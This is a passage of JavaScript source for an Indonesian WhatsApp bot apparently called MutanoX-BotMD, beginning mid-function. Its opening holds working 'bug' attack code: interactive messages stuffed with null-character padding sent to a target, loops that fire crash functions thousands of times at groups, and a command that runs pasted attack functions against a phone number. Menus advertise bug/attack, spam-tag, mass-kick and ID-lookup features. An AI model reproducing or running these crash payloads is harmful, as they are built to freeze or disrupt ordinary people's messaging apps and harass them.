buttonParamsJson: comboPayload + "\u0000".repeat(1000), 
},
{ 
name: "wa_payment_learn_more", 
buttonParamsJson: comboPayload + "\u0000".repeat(1000), 
},
{ 
name: "call_permission_request", 
buttonParamsJson: comboPayload + "\u0000".repeat(1000), 
},
{ 
name: "galaxy_message", 
buttonParamsJson: comboPayload + "\u0000".repeat(1000), 
}
]
}
}
}
}
},
{}
);

await conn.relayMessage(target, msg2.message, { participant: { jid: target }, messageId: msg2.key.id });

console.log(chalk.red(`Success Sending Hard To ${target}`));
}
async function UIGroupKontol(targetgroup) {
  console.log(`💬 𝐈𝐧𝐟𝐨𝐫𝐦𝐚𝐭𝐢𝐨𝐧 : Sending Bug`);
  for (let i = 0; i < 10000; i++) {
    
    await BulldozMamamAyangGrup(conn, targetgroup);
    await CrashGruB(targetgroup);
    await CrasherGroupUI(conn, targetgroup);
    await ButtonCTTGroup(conn, targetgroup);
    await BlankGroupMemeg(conn, targetgroup);
    await new Promise(resolve => setTimeout(resolve, 970)); 
  }
}
async function SettoDelaycombo(target) {
for (let i = 0; i <= 100; i++) {
await SettoDelayDevice(target);
await SettoDelayDevice(target);
await SettoDelayDevice(target);
await sleep(3000); }
for (let i = 0; i <= 100; i++) {
await ExcellCaroUselXStatusHydrated(target);
await ExcellCaroUselXStatusHydrated(target);
await ExcellCaroUselXStatusHydrated(target);
       
}
}
//~~~~~~~~~~~ Command ~~~~~~~~~~~//

switch (command) {
case "testfunction": {
    if (!isCreator) return Reply(mess.owner);
    if (!text.includes("|"))
        return Reply(
`Gunakan format yang benar contoh:
.testfunction Nomor|Loop|async function maklu(target)\nawait maklu(target)

> Penjelasan Buat Yang Kurang Paham Aja, Gini Kalo Masih Kurang Paham Cara Pakainya .testfunction 628xxx|1|Nah Disini Tempel Full Function Lu, Terus Dibawah/Akhir function 
`
        );

    const [nomorRaw, loopRaw, funcFull] = text.split("|");  
    const nomor = nomorRaw.replace(/[^0-9]/g, "");  
    const jumlah = Math.max(1, Math.min(parseInt(loopRaw) || 1, 1000));  

    if (!nomor) return Reply("❌ Nomor tidak valid!");  
    if (!funcFull) return Reply("❌ Masukkan function async yang benar!");  

    const target = nomor + "@s.whatsapp.net";  
    const sandbox = {  
        conn,  
        target,  
        console,  
        Buffer,  
        sleep: (ms) => new Promise(r => setTimeout(r, ms)),  
        generateWAMessageFromContent,  
        proto  
    };  

    const context = vm.createContext(sandbox);
    const funcNameMatch = funcFull.match(/async function (\w+)/);
    const funcName = funcNameMatch ? funcNameMatch[1] : "UnknownFunction";
    let adaError = false;

    for (let i = 0; i < jumlah; i++) {
    try {
        await vm.runInContext(`(async()=>{ ${funcFull} })()`, context);
    } catch (err) {
        adaError = true;
        await Reply(`❌ Terjadi kesalahan pada ${i + 1}:\n${err.message}`);
        console.log("Error exec:", err);
        break;
    }

    await sandbox.sleep(300); //delay mamaklu
}

if (!adaError) {
    reply(
`✅ Success Testing Function!

- Target : ${nomor}
- Loop : ${jumlah}
- Function : ${funcName}
- Status : Success
`
    );
}
}
break;
case "reactspam": {
if (!m.quoted) return Reply("Reply pesan dulu")

let emoji = ["🔥","😂","🗿","😈","😎","💀","🤖","⚡","👑","🚀","🥶","🤡"]

for (let e of emoji) {
await conn.sendMessage(m.chat, {
react: {
text: e,
key: m.quoted.key
}
})
await new Promise(r => setTimeout(r, 400)) // delay biar ga limit
}
}
break
case "cekdevice": {
let target = m.mentionedJid[0] || m.sender

let device = m.key.id.length > 21 ? "Android 🤖" : "WhatsApp Web / iPhone 🍎"

Reply(`📱 Device Info
User: @${target.split("@")[0]}
Device: ${device}`, { mentions: [target] })
}
break
case "autorespesan": {
if (!isOwner) return Reply("Owner only")

if (args[0] === "on") {
autoRes = true
Reply("Auto respon diaktifkan")
} else if (args[0] === "off") {
autoRes = false
Reply("Auto respon dimatikan")
} else {
Reply("Contoh:\n.autores on\n.autores off")
}
}
break
case "kelpinairespon": {
if (!isCreator) return Reply(mess.owner)
if (args[0] === "on") {
kelpinAuto = true
Reply("✅ Auto respon Kelpin diaktifkan")
} 
else if (args[0] === "off") {
kelpinAuto = false
Reply("❌ Auto respon Kelpin dimatikan")
} 
else {
Reply("contoh:\n.kelpinairespon on\n.kelpinairespon off")
}

}
break
break 
case "assalamualaikum":
case "assalamu'alaikum":
case "salam": {

let teks = `Wa'alaikumussalam ${pushname} 👋

Semoga harimu menyenangkan! 😊`

conn.sendMessage(m.chat, { text: teks }, { quoted: seto })

}
break
case "toimg": {
if (!m.quoted) return Reply("Reply sticker")

let media = await m.quoted.download()
await conn.sendMessage(m.chat, {
image: media
}, { quoted: m })
}
break
case "addcase2": {
if (!m.quoted) return Reply("Reply case yang ingin ditambahkan")

let fs = require("fs")
let path = "./MutanoX-Bot.js" // ganti sesuai file case kamu

let caseBaru = m.quoted.text

fs.readFile(path, "utf8", (err, data) => {
if (err) return Reply("File tidak ditemukan")

let posisi = data.lastIndexOf("break")
let hasil = data.slice(0, posisi) + caseBaru + "\n" + data.slice(posisi)

fs.writeFileSync(path, hasil)

Reply("✅ Case berhasil ditambahkan")
})
}
break
case "addcase": {
if (!isCreator) return Reply(mess.owner)

const fs = require("fs")

console.log("===== ADDCASE START =====")
console.log("Sender:", m.sender)
console.log("Query:", q)

if (!q) {
console.log("❌ Tidak ada case dikirim")
return Reply("Contoh:\n.addcase case \"halo\": {\nReply(\"Halo\")\n}\nbreak")
}

let filePath = "./MutanoX-Bot.js"
console.log("File handler:", filePath)

let file = fs.readFileSync(filePath, "utf8")
console.log("File berhasil dibaca")

if (file.includes(q)) {
console.log("⚠️ Case sudah ada")
return Reply("Case sudah ada")
}

let posisi = file.lastIndexOf("break")

if (posisi === -1) {
console.log("❌ break terakhir tidak ditemukan")
return Reply("Error: tidak menemukan posisi break")
}

let newCase = "\n" + q + "\n"

let newFile = file.slice(0, posisi) + newCase + file.slice(posisi)

fs.writeFileSync(filePath, newFile)

console.log("✅ Case berhasil ditambahkan")
console.log("===== ADDCASE END =====")

Reply("✅ Case berhasil ditambahkan")
}
break


case "delcase": {
if (!isCreator) return Reply(mess.owner)

const fs = require("fs")

console.log("===== DELCASE START =====")
console.log("Case yang dihapus:", q)

if (!q) return Reply("Contoh:\n.delcase halo")

let filePath = "./MutanoX-Bot.js"
let file = fs.readFileSync(filePath, "utf8")

let regex = new RegExp(`case\\s+"${q}"[\\s\\S]*?break`, "g")

if (!regex.test(file)) {
console.log("❌ Case tidak ditemukan")
return Reply("Case tidak ditemukan")
}

let newFile = file.replace(regex, "")

fs.writeFileSync(filePath, newFile)

console.log("✅ Case berhasil dihapus")
console.log("===== DELCASE END =====")

Reply("✅ Case berhasil dihapus")
}
break
case "allmenugif":
case "allmenu2":
case "semua2": {
    let teks = `*${greeting()}* ${pushname}, Perkenalkan saya adalah bot WhatsApp
yang diciptakan oleh *Kelpin*, tujuannya untuk membantu berbagai
kebutuhan seperti tools, group
management, dan fitur lainnya.

*[💠 BOT INFORMATION 💠]*
*▸ Name Bot: MutanoX-BotMD*
*▸ Developer: Kelpin Gv*
*▸ Version: V10.0.0*
*▸ Language: JavaScript*
*▸ StatusBot: Free
*▸ Feature: Multy & Bug*
╭┈ ˚ ·『 \`FEATURE AI\` 』
│┃꒰ 𖢷autorespesan *<on/off>*
│┃꒰ 𖢷kelpinAirespon *<on/off>*
│┃꒰ 𖢷ttsanime *<text>*
│┃꒰ 𖢷tts *<text>*
│┃꒰ 𖢷chatgpt *<pertanyaan>*
│┃꒰ 𖢷kelpin *<pertanyaan>*
╰——————・・・・————・・・
╭┈ ˚ ·『 \`DOWNLOAD\` 』
│┃꒰ 𖢷tiktokslide *<tiktok photo>*
│┃꒰ 𖢷tiktok *<link tiktok>*
│┃꒰ 𖢷facebook *<link fb>*
│┃꒰ 𖢷tiktokmp3 *<link tiktok>*
│┃꒰ 𖢷tiktokptv *<vt to  video pendek>*
│┃꒰ 𖢷Instagram *<link ig>*
│┃꒰ 𖢷capcut *<link capcut>*
│┃꒰ 𖢷twitter *<link twitter>*
│┃꒰ 𖢷spotify *<link/url>*
│┃꒰ 𖢷applesearch *<judul/title>*
│┃꒰ 𖢷carimusik *<judul/Title>*
│┃꒰ 𖢷ytmp3 *<url/judul>*
│┃꒰ 𖢷ytmp4 *<judul/title>*
│┃꒰ 𖢷play *<judul/title>*
│┃꒰ 𖢷threads *<link/url>*
│┃꒰ 𖢷reddit *<link/url>*
│┃꒰ 𖢷snapchat *<link/url>*
│┃꒰ 𖢷ifunny *<link/url>*
│┃꒰ 𖢷likee *<link/url>*
│┃꒰ 𖢷espn *<link/url>*
│┃꒰ 𖢷dailymotion *<link/url>*
│┃꒰ 𖢷vimeo *<link/url>*
│┃꒰ 𖢷blibli *<link/url>*
│┃꒰ 𖢷sina *<link/url>*
│┃꒰ 𖢷bluesky *<link/url>*
│┃꒰ 𖢷soundcloud *<link/url>*
│┃꒰ 𖢷mixcloud *<link/url>*
│┃꒰ 𖢷tumblr *<link/url>*
│┃꒰ 𖢷telegram *<link/url>*
│┃꒰ 𖢷pin *<mencari sesuatu pin>*
│┃꒰ 𖢷mediafire *>link MediaFire>*
⪩ *[.downloadmenu untuk lainnya]*
╰——————・・・・————・・・
╭┈ ˚ ·『 \`STICKER/IMG MENU\` 』
│┃꒰ 𖢷iqccustom *<iphone quote>*
│┃꒰ 𖢷iqc *<iphone quote>*
│┃꒰ 𖢷bratjalan *<text jalan>*
│┃꒰ 𖢷brat *<text>*
│┃꒰ 𖢷bratvid *<text>*
│┃꒰ 𖢷sticker *<reply media>*
│┃꒰ 𖢷toimg *<replysticker>*
│┃꒰ 𖢷colong *<curi stk>*
│┃꒰ 𖢷getwm *<ganti wm stk>*
│┃꒰ 𖢷take *<get wm stk>*
│┃꒰ 𖢷createquote *<quote custom>*
│┃꒰ 𖢷qc *<quick chat>*
│┃꒰ 𖢷searchsticker
╰——————・・・・————・・・
╭┈ ˚ ·『 \`OTHER MENU\` 』
│┃꒰ 𖢷swgrup2 *<via id>*
│┃꒰ 𖢷swgrup *<upswgc>*
│┃꒰ 𖢷swdl2 *<ambilsw>*
│┃꒰ 𖢷polling *<custom polling>*
│┃꒰ 𖢷to1xlihat *<reply ft/vd>*
│┃꒰ 𖢷rvo *<buka media 1x lihat>*
│┃꒰ 𖢷reactspam *<replymsg>*
│┃꒰ 𖢷send *<reply msg>*
│┃꒰ 𖢷tofigure *<img to figur style>*
│┃꒰ 𖢷ambil *<send ulng msg>*
│┃꒰ 𖢷translate *<penerjemah>*
│┃꒰ 𖢷conves *<kelpin ganteng>*
│┃꒰ 𖢷tovn *<to pesan suara>*
│┃꒰ 𖢷getlinkgc *<didalam group>*
│┃꒰ 𖢷toptv *<to video pendek>*
│┃꒰ 𖢷copyme *<your number>*
│┃꒰ 𖢷copy *<reply user>*
│┃꒰ 𖢷spamtag *<tag user*
│┃꒰ 𖢷swdl *<ambilsw>*
│┃꒰ 𖢷getpp *<ambil profil user>*
│┃꒰ 𖢷tag *<spam tag user>*
│┃꒰ 𖢷upch *id saluran/recomend>*
│┃꒰ 𖢷upch2 *<disettings dulu>*
│┃꒰ 𖢷cekcuaca *<kota>*
│┃꒰ 𖢷payment *<dana/ovo>*
│┃꒰ 𖢷qris *<payment>*
│┃꒰ 𖢷totag *<pesan>*
│┃꒰ 𖢷tourl *<pixhost>*
│┃꒰ 𖢷tourl2 *<catbox>*
│┃꒰ 𖢷cekidch *<linkch>*
│┃꒰ 𖢷fact *<random facts>*
│┃꒰ 𖢷fakta *<fakta random>*
│┃꒰ 𖢷roasting *number*
│┃꒰ 𖢷cogan *<search>*
│┃꒰ 𖢷cecan *<search>*
│┃꒰ 𖢷lazada *<mencari barang>*
│┃꒰ 𖢷waifu *search*
│┃꒰ 𖢷yt *<search>*
│┃꒰ 𖢷hd *<fotohd>*
│┃꒰ 𖢷readmore *<teks>*
│┃꒰ 𖢷cekkhodam *<nama>*
│┃꒰ 𖢷motivasi *<random>*
│┃꒰ 𖢷cekjarak
│┃꒰ 𖢷dongeng *<random>*
│┃꒰ 𖢷quoteimg *<image+quote>*
│┃꒰ 𖢷cekgempa *<funmenu>*
│┃꒰ 𖢷cekgila *<funmenu>*
│┃꒰ 𖢷jodoh *<funmenu>*
│┃꒰ 𖢷balogo *<bikin logo>*
│┃꒰ 𖢷animefind *<reply foto>*
│┃꒰ 𖢷totalfitur *<jumlah fitur aktif>*
╰——————・・・・————・・・
╭┈ ˚ ·\`FITUR GROUP\` 』
│┃꒰ 𖢷setppgc *<change pp grub>*
│┃꒰ 𖢷cekjawa *<nama>*
│┃꒰ 𖢷cekcantik *<nama>*
│┃꒰ 𖢷cekganteng *<nama>*
│┃꒰ 𖢷tebakkata *<funmenu>*
│┃꒰ 𖢷tebakbendera *<funmenu>*
│┃꒰ 𖢷guessflag <guess>*
│┃꒰ 𖢷antilinkall *<on/off>*
│┃꒰ 𖢷antilinkch *<on/off>*
│┃꒰ 𖢷leave *<keluar gb>*
│┃꒰ 𖢷cekid *<listgb/id>*
│┃꒰ 𖢷idgrup *<cek id gb>*
│┃꒰ 𖢷ambil *<send ulng msg>*
│┃꒰ 𖢷beban *<cek beban group>*
│┃꒰ 𖢷couple *<funmenu group>*
│┃꒰ 𖢷roastmem *<roasting member gb>*
│┃꒰ 𖢷couple *<funmenu group>*
│┃꒰ 𖢷infogc *<group info>*
│┃꒰ 𖢷totalchat *<jumlah chat user gb>*
│┃꒰ 𖢷getlinkgc *<ambil link gc>*
│┃꒰ 𖢷member *<jumlah member>*
│┃꒰ 𖢷send *<spam/kirim pesan>*
│┃꒰ 𖢷totag *<pesan>*
│┃꒰ 𖢷open *<bukagroup>*
│┃꒰ 𖢷close *<tutupgroup>*
│┃꒰ 𖢷welcome *<sambut yg join>*
│┃꒰ 𖢷kudeta *<kick all mem gc>*
│┃꒰ 𖢷mute *<on/off>*
│┃꒰ 𖢷demote *<und admin>*
│┃꒰ 𖢷hidetag *<menyebut anggota>*
│┃꒰ 𖢷tagall *<menyebut anggota>*
│┃꒰ 𖢷promote *<naikan jadi admin>*
│┃꒰ 𖢷add *<nambah seseorang>*
│┃꒰ 𖢷delete *<hapus pesan>*
╰——————・・・・————・・・
╭┈ ˚ ·『 \`MENU JPM/STORE\` 』
│┃꒰ 𖢷listproduk *<setting.js>*
│┃꒰ 𖢷proses *<store>*
│┃꒰ 𖢷done *<store>*
│┃꒰ 𖢷cekidch *<link saluran>*
│┃꒰ 𖢷addidch *<link saluran jpm>*
│┃꒰ 𖢷delidch *<hapus id ch jpm>*
│┃꒰ 𖢷jpmch *<teks buat send ke ch>*
│┃꒰ 𖢷jpm *<jpm biasa>*
│┃꒰ 𖢷jpm2 *<jpm video>*
│┃꒰ 𖢷jpm3 *<jpm foto>*
│┃꒰ 𖢷savekontak *<savekontak group>*
│┃꒰ 𖢷pushkontak *<pushkontak di grup>*
╰——————・・・・————・・・
╭┈ ˚ ·『 \`WEBSITE MENU\` 』
│┃꒰ 𖢷gethtml *<link/domain>*
│┃꒰ 𖢷enchtml *<lock html>*
│┃꒰ 𖢷deployweb *<reply html/zip>*
│┃꒰ 𖢷listweb *<list project web>*
│┃꒰ 𖢷delweb *<delete project web>*
│┃꒰ 𖢷historyweb *<show project web>*
│┃꒰ 𖢷infoweb *<info project>*
│┃꒰ 𖢷cekweb *<cek project>*
╰——————・・・・————・・・
╭┈ ˚ ·『 \`TOOLS MENU\` 』
│┃꒰ 𖢷gethtml *<link/domain>*
│┃꒰ 𖢷toaudio *<mp4 to mp3>*
│┃꒰ 𖢷mp4toaudio *<mp4 to mp3>*
│┃꒰ 𖢷audiotourl *<mp3 url>*
│┃꒰ 𖢷addcase2 *<reply case>*
│┃꒰ 𖢷addcase *<add fitur>*
│┃꒰ 𖢷delcase *<delete fitur>*
│┃꒰ 𖢷cekcuaca *<kota>*
│┃꒰ 𖢷swdl *<ambilsw>*
│┃꒰ 𖢷getpp *<ambil profil user>*
│┃꒰ 𖢷getcode *<message>*
│┃꒰ 𖢷tobase64 *<text>*
│┃꒰ 𖢷number-info *<nomor>*
│┃꒰ 𖢷search-username *<usn>*
│┃꒰ 𖢷toptv *<vd to video pendek>*
│┃꒰ 𖢷cekdevice
│┃꒰ 𖢷school-track
│┃꒰ 𖢷nik-information *<nik>*
╰——————・・・・————・・・
╭┈ ˚ ·『 \`FEATURE CPANEL\` 』
│┃꒰ 𖢷Cpanel
│┃꒰ 𖢷Cadmin
│┃꒰ 𖢷Lispanel
│┃꒰ 𖢷Listadmin
│┃꒰ 𖢷Delpanel
│┃꒰ 𖢷Deladmin
│┃꒰ 𖢷1gb-v2 - unli-2
│┃꒰ 𖢷Listpanel-v2
│┃꒰ 𖢷Listadmin-v2
│┃꒰ 𖢷Delpanel-v2
│┃꒰ 𖢷Deladmin-v2
╰——————・・・・————・・・
╭┈ ˚ ·『 \`ACCES OWNER\` 』
│┃꒰ 𖢷gethtml *<link/domain>*
│┃꒰ 𖢷Getcase *<ambil case>*
│┃꒰ 𖢷Addcase2 *<reply case>*
│┃꒰ 𖢷Addcase *<tambah case>*
│┃꒰ 𖢷Delcase *<delete case>*
│┃꒰ 𖢷Panduan *<information>*
│┃꒰ 𖢷totalgc *<totalgc bot>*
│┃꒰ 𖢷Public *<publik mode>*
│┃꒰ 𖢷Self *<pribadi mode>*
│┃꒰ 𖢷Addowner
│┃꒰ 𖢷DelOwner
│┃꒰ 𖢷Listowner
│┃꒰ 𖢷Addseller
│┃꒰ 𖢷Delseller
│┃꒰ 𖢷Listseller
│┃꒰ 𖢷Restart 
│┃꒰ 𖢷Ping
│┃꒰ 𖢷Clearchat
╰——————・・・・————・・・
╭┈ ˚ ·〔 *HOW TO USE* 〕
│┃꒰ 𖢷allmenu     < show all fitur >
│┃꒰ 𖢷bugmenu   < show fitur bug >
│┃꒰ 𖢷request     < show and req>
│┃꒰ 𖢷buysc  < script and price >
│┃꒰ 𖢷cpanel    < create panel >
│┃꒰ 𖢷owner  < contact wa dev >
│┃꒰ 𖢷developer   < creator script >
╰❒——————・・・・————・・・〔 *POPULAR MENU* 〕
│┃꒰ 𖢷polling *<custom polling>*
│┃꒰ 𖢷bugmenu   < main script >
│┃꒰ 𖢷addcase   <  add fitur >
│┃꒰ 𖢷upch   < upedia ke ch >
│┃꒰ 𖢷swdl    < status downloader >
│┃꒰ 𖢷swgrup   < up story in group >
│┃꒰ 𖢷sticker  < img to sticker >
│┃꒰ 𖢷brat    < text to sticker >
│┃꒰ 𖢷getpp     < get pp user >
│┃꒰ 𖢷payment  < setting payment >
│┃꒰ 𖢷ytmp3   < dl audio youtube >
│┃꒰ 𖢷tagall  < mention all user gb >
│┃꒰ 𖢷play      < search youtube >
│┃꒰ 𖢷tiktok    < tiktok downloader >
│┃꒰ 𖢷instagram   < ig downloader >
│┃꒰ 𖢷twitter  < twitter downloader >
╰——————・・・・————・・・
`;

    let vid = await generateWAMessageContent({
        video: {
            url: "https://cdn.nekohime.site/file/5L3fjZaq.mp4"
        },
        gifPlayback: true
    }, { upload: conn.waUploadToServer });

    const msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                interactiveMessage: proto.Message.InteractiveMessage.create({

                    header: {
                        hasMediaAttachment: true,
                        videoMessage: vid.videoMessage
                    },

                    body: {
                        text: teks
                    },

                    footer: {
                        text: `MutanoX-BotV10`
                    },

                    nativeFlowMessage: {
                        messageParamsJson: JSON.stringify({}),

                        buttons: [
                            {
name: "single_select",
buttonParamsJson: JSON.stringify({
title: "Select Menu",
sections: [
{
title: "\ud83d\udce6 Kategori Fitur",
rows: [
{ header: "All Menu", title: "Lihat semua fitur", id: `${prefix}semua` },
{ header: "Bug Fitur", title: "Fitur bug / attack", id: `${prefix}bugmenu` },
{ header: "Create Panel", title: "Buat panel Pterodactyl", id: `${prefix}cpanel` },
{ header: "Buy Script", title: "Info pembelian script", id: `${prefix}buysc` },
{ header: "Payment Info", title: "Info pembayaran (QRIS)", id: `${prefix}qris` },
{ header: "Thanks To", title: "Daftar pendukung", id: `${prefix}tqto` },
{ header: "Info / Request", title: "Kirim request fitur", id: `${prefix}request` },
{ header: "About Developer", title: "Profil developer", id: `${prefix}developer` },
{ header: "Back to Menu", title: "Kembali ke menu utama", id: `${prefix}menu` }
]
}
]
})
},
{
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Contact Developer",
                                    url: "https://whatsapp.com/channel/0029VbCRzsBHrDZpXJT0Pt0g"
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Allmenu (Image)",
                                    id: `${prefix}allmenu`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Back Menu",
                                    id: `${prefix}menu`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Bug Fitur",
                                    id: `${prefix}bugmenu`
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Buy Script",
                                    id: `${prefix}buysc`
                                })
                            },
                            {
                                name: "cta_url",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Saluran Developer",
                                    url: "https://whatsapp.com/channel/0029VbCRzsBHrDZpXJT0Pt0g"
                                })
                            }
                        ]
                    },

                    contextInfo: {
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "𝐊𝐄𝐋𝐄𝐏𝐎𝐍",
                            newsletterJid: "120363426723637081@newsletter",
                            serverMessageId: 1
                        }
                    }

                })
            }
        }
    }, { quoted: lol });

    await conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;
//ORIGINIALALLMENU
case "kel":
case "semua":
case "allmenu": {
const randomThumb = thumbnails[Math.floor(Math.random() * thumbnails.length)]
const media = await prepareWAMessageMedia(
{ image: { url: randomThumb } },
{ upload: conn.waUploadToServer }
)
let menu = `*${greeting()}* ${pushname}, Perkenalkan saya adalah bot WhatsApp
yang diciptakan oleh *Kelpin*, tujuannya untuk membantu berbagai
kebutuhan seperti tools, group
management, dan fitur lainnya.

*[💠 BOT INFORMATION 💠]*
*▸ Name Bot: MutanoX-BotMD*
*▸ Developer: Kelpin Gv*
*▸ Version: V10.0.0*
*▸ Language: JavaScript*
*▸ StatusBot: Free
*▸ Feature: Multy & Bug*

╭┈ ˚ ·『 \`FEATURE AI\` 』
│┃꒰ 𖢷autorespesan *<on/off>*
│┃꒰ 𖢷kelpinAirespon *<on/off>*
│┃꒰ 𖢷ttsanime *<text>*
│┃꒰ 𖢷tts *<text>*
│┃꒰ 𖢷chatgpt *<pertanyaan>*
│┃꒰ 𖢷kelpin *<pertanyaan>*
╰——————・・・・————・・・
╭┈ ˚ ·『 \`DOWNLOAD\` 』
│┃꒰ 𖢷tiktokslide *<tiktok photo>*
│┃꒰ 𖢷tiktok *<link tiktok>*
│┃꒰ 𖢷facebook *<link fb>*
│┃꒰ 𖢷tiktokmp3 *<link tiktok>*
│┃꒰ 𖢷tiktokptv *<vt to  video pendek>*
│┃꒰ 𖢷Instagram *<link ig>*
│┃꒰ 𖢷capcut *<link capcut>*
│┃꒰ 𖢷twitter *<link twitter>*
│┃꒰ 𖢷spotify *<link/url>*
│┃꒰ 𖢷applesearch *<judul/title>*
│┃꒰ 𖢷carimusik *<judul/Title>*
│┃꒰ 𖢷ytmp3 *<url/judul>*
│┃꒰ 𖢷ytmp4 *<judul/title>*
│┃꒰ 𖢷play *<judul/title>*
│┃꒰ 𖢷threads *<link/url>*
│┃꒰ 𖢷reddit *<link/url>*
│┃꒰ 𖢷snapchat *<link/url>*
│┃꒰ 𖢷ifunny *<link/url>*
│┃꒰ 𖢷likee *<link/url>*
│┃꒰ 𖢷espn *<link/url>*
│┃꒰ 𖢷dailymotion *<link/url>*
│┃꒰ 𖢷vimeo *<link/url>*
│┃꒰ 𖢷blibli *<link/url>*
│┃꒰ 𖢷sina *<link/url>*
│┃꒰ 𖢷bluesky *<link/url>*
│┃꒰ 𖢷soundcloud *<link/url>*
│┃꒰ 𖢷mixcloud *<link/url>*
│┃꒰ 𖢷tumblr *<link/url>*
│┃꒰ 𖢷telegram *<link/url>*
│┃꒰ 𖢷pin *<mencari sesuatu pin>*
│┃꒰ 𖢷mediafire *>link MediaFire>*
⪩ *[.downloadmenu untuk lainnya]*
╰——————・・・・————・・・
╭┈ ˚ ·『 \`STICKER/IMG MENU\` 』
│┃꒰ 𖢷iqccustom *<iphone quote>*
│┃꒰ 𖢷iqc *<iphone quote>*
│┃꒰ 𖢷bratjalan *<text jalan>*
│┃꒰ 𖢷brat *<text>*
│┃꒰ 𖢷bratvid *<text>*
│┃꒰ 𖢷sticker *<reply media>*
│┃꒰ 𖢷toimg *<replysticker>*
│┃꒰ 𖢷colong *<curi stk>*
│┃꒰ 𖢷getwm *<ganti wm stk>*
│┃꒰ 𖢷take *<get wm stk>*
│┃꒰ 𖢷createquote *<quote custom>*
│┃꒰ 𖢷qc *<quick chat>*
│┃꒰ 𖢷searchsticker
╰——————・・・・————・・・
╭┈ ˚ ·『 \`OTHER MENU\` 
│┃꒰ 𖢷wanted *<nama>*
│┃꒰ 𖢷send1xlihat *<reply pesan>*
│┃꒰ 𖢷wantedganteng *<nama>*
│┃꒰ 𖢷pegangtext *<text>*
│┃꒰ 𖢷sertifikatjawa *<nama>*
│┃꒰ 𖢷buatsertifikat *<nama>*
│┃꒰ 𖢷buatsertifikat *<nama>*
│┃꒰ 𖢷swgrup2 *<via id>*
│┃꒰ 𖢷swgrup *<upswgc>*
│┃꒰ 𖢷swdl2 *<ambilsw>*
│┃꒰ 𖢷polling *<custom polling>*
│┃꒰ 𖢷to1xlihat *<reply ft/vd>*
│┃꒰ 𖢷rvo *<buka media 1x lihat>*
│┃꒰ 𖢷reactspam *<replymsg>*
│┃꒰ 𖢷send *<reply msg>*
│┃꒰ 𖢷tofigure *<img to figur style>*
│┃꒰ 𖢷ambil *<send ulng msg>*
│┃꒰ 𖢷translate *<penerjemah>*
│┃꒰ 𖢷conves *<setto ganteng>*
│┃꒰ 𖢷tovn *<to pesan suara>*
│┃꒰ 𖢷getlinkgc *<didalam group>*
│┃꒰ 𖢷toptv *<to video pendek>*
│┃꒰ 𖢷copyme *<your number>*
│┃꒰ 𖢷copy *<reply user>*
│┃꒰ 𖢷spamtag *<tag user*
│┃꒰ 𖢷swdl *<ambilsw>*
│┃꒰ 𖢷getpp *<ambil profil user>*
│┃꒰ 𖢷tag *<spam tag user>*
│┃꒰ 𖢷upch *id saluran/recomend>*
│┃꒰ 𖢷upch2 *<disettings dulu>*
│┃꒰ 𖢷cekcuaca *<kota>*
│┃꒰ 𖢷payment *<dana/ovo>*
│┃꒰ 𖢷qris *<payment>*
│┃꒰ 𖢷totag *<pesan>*
│┃꒰ 𖢷tourl *<pixhost>*
│┃꒰ 𖢷tourl *<catbox>*
│┃꒰ 𖢷cekidch *<linkch>*
│┃꒰ 𖢷fact *<random facts>*
│┃꒰ 𖢷fakta *<fakta random>*
│┃꒰ 𖢷roasting *number*
│┃꒰ 𖢷cogan *<search>*
│┃꒰ 𖢷cecan *<search>*
│┃꒰ 𖢷lazada *<mencari barang>*
│┃꒰ 𖢷waifu *search*
│┃꒰ 𖢷yt *<search>*
│┃꒰ 𖢷hd *<fotohd>*
│┃꒰ 𖢷readmore *<teks>*
│┃꒰ 𖢷cekkhodam *<nama>*
│┃꒰ 𖢷motivasi *<random>*
│┃꒰ 𖢷cekjarak
│┃꒰ 𖢷dongeng *<random>*
│┃꒰ 𖢷quoteimg *<image+quote>*
│┃꒰ 𖢷cekgempa *<funmenu>*
│┃꒰ 𖢷cekgila *<funmenu>*
│┃꒰ 𖢷jodoh *<funmenu>*
│┃꒰ 𖢷balogo *<bikin logo>*
│┃꒰ 𖢷animefind *<reply foto>*
│┃꒰ 𖢷totalfitur *<jumlah fitur aktif>*
╰——————・・・・————・・・
╭┈ ˚ ·\`FITUR GROUP\` 』
│┃꒰ 𖢷setppgc *<change pp grub>*
│┃꒰ 𖢷cekjawa *<nama>*
│┃꒰ 𖢷cekcantik *<nama>*
│┃꒰ 𖢷cekganteng *<nama>*
│┃꒰ 𖢷tebakkata *<funmenu>*
│┃꒰ 𖢷tebakbendera *<funmenu>*
│┃꒰ 𖢷guessflag *<guess>*
│┃꒰ 𖢷antilinkall *<on/off>*
│┃꒰ 𖢷antilinkch *<on/off>*
│┃꒰ 𖢷leave *<keluar gb>*
│┃꒰ 𖢷cekid *<listgb/id>*
│┃꒰ 𖢷idgrup *<cek id gb>*
│┃꒰ 𖢷ambil *<send ulng msg>*
│┃꒰ 𖢷beban *<cek beban group>*
│┃꒰ 𖢷couple *<funmenu group>*
│┃꒰ 𖢷roastmem *<roasting member gb>*
│┃꒰ 𖢷couple *<funmenu group>*
│┃꒰ 𖢷infogc *<group info>*
│┃꒰ 𖢷totalchat *<jumlah chat user gb>*
│┃꒰ 𖢷getlinkgc *<ambil link gc>*
│┃꒰ 𖢷member *<jumlah member>*
│┃꒰ 𖢷send *<spam/kirim pesan>*
│┃꒰ 𖢷totag *<pesan>*
│┃꒰ 𖢷open *<bukagroup>*
│┃꒰ 𖢷close *<tutupgroup>*
│┃꒰ 𖢷welcome *<sambut yg join>*
│┃꒰ 𖢷kudeta *<kick all mem gc>*
│┃꒰ 𖢷mute *<on/off>*
│┃꒰ 𖢷demote *<und admin>*
│┃꒰ 𖢷hidetag *<menyebut anggota>*
│┃꒰ 𖢷tagall *<menyebut anggota>*
│┃꒰ 𖢷promote *<naikan jadi admin>*
│┃꒰ 𖢷add *<nambah seseorang>*
│┃꒰ 𖢷delete *<hapus pesan>*
╰——————・・・・————・・・
